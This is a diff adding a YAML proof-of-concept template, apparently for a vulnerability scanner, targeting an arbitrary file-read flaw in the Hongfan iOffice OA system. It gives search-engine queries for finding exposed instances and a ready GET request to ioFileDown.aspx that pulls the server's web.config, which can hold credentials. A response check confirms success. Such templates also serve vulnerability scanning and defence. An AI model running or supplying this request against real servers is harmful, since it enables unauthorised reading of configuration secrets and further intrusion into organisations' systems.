@@ -1,0 +1,35 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="红帆-ioffice"
+    hunter-query: app.name=="红帆 iOffice"
+    quake-query: app:"ioffice红帆OA协同办公系统"  
+    zoomeye-query: app:"红帆 ioffice"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    tips:
+    
+name: poc-yaml-hongfan-ioFileDown.aspx-file-read
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /ioffice/prg/interface/ioFileDown.aspx?sFilePath=/ioffice/web.config
+            headers:
+            body:         
+        expression: response.status == 200 && response.body_string.contains("<configSections>") && response.raw_header.bcontains(b'application/octet-stream')
+
+expression: r0() 
